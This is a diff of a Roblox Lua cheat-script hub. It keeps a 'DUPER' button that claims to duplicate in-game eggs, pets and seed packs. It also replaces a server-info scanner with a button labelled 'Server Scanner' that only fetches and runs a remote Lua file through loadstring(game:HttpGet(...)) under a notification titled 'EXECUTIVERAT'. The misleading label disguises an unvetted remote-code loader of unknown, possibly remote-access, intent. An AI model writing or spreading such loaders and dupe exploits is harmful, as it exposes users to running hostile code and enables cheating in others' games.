@@ -21,7 +21,6 @@ local Tab = Window:CreateTab({
 	ShowTitle = true
 })
 
--- DUPER Button
 local Button = Tab:CreateButton({
 	Name = "DUPER",
 	Description = "DUPER Script, used to duplicate EGGS, PETS and SEEDPACKS",
@@ -32,76 +31,17 @@ local Button = Tab:CreateButton({
 		})
 	end
 })
-
--- Server Scanner Button (Improved Implementation)
-local ServerScannerButton = Tab:CreateButton({
+local Button = Tab:CreateButton({
 	Name = "Server Scanner",
-	Description = "Scan server information and metrics",
+	Description = "SERVER SCANNER, know your luck !!",
 	Callback = function()
-		local debounce = false
-		
-		if debounce then return end
-		debounce = true
-		
-		-- Store original button state
-		local originalText = ServerScannerButton.Settings.Name
-		local originalName = ServerScannerButton.Settings.Name
-		
-		-- Update button appearance during scan
-		ServerScannerButton:Set({
-			Name = "SCANNING...",
-			Description = "Processing server data..."
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/deepseek_lua_20250621_fb7786.lua"))()
+		Luna:Notification({ 
+			Title = "EXECUTIVERAT",
+			Content = "SCANNING SERVER"
 		})
-		
-		-- Execute scan with error handling
-		local success, err = pcall(function()
-			-- Get server information
-			local jobId = game.JobId
-			local players = game:GetService("Players"):GetPlayers()
-			local numPlayers = #players
-			local serverAgeSeconds = workspace.DistributedGameTime
-			local serverAge = string.format("%d minutes, %d seconds", math.floor(serverAgeSeconds/60), math.floor(serverAgeSeconds%60))
-			
-			-- Execute external scanner script
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripthubpetsimx/Dark-HUB/refs/heads/main/deepseek_lua_20250621_fb7786.lua"))()
-			
-			-- Show results
-			local message = string.format(
-				"Server Scan Complete!\n\n"..
-				"Server ID: %s\n"..
-				"Players: %d\n"..
-				"Server Age: %s\n"..
-				"Place Version: %d",
-				jobId, numPlayers, serverAge, game.PlaceVersion
-			)
-			
-			Luna:Notification({
-				Title = "Server Scan Results",
-				Content = message,
-				Duration = 10
-			})
-		end)
-		
-		-- Handle errors
-		if not success then
-			Luna:Notification({
-				Title = "Scan Failed",
-				Content = "Error: "..tostring(err):sub(1, 100),
-				Duration = 5
-			})
-		end
-		
-		-- Reset button after delay
-		task.wait(2)
-		ServerScannerButton:Set({
-			Name = originalName,
-			Description = "Scan server information and metrics"
-		})
-		debounce = false
 	end
 })
-
--- Rest of your script remains unchanged...
 local Button = Tab:CreateButton({
 	Name = "No-lag OFICCIAL",
 	Description = "Free No Lag v1 | Changelog = [+] Auto Craft",
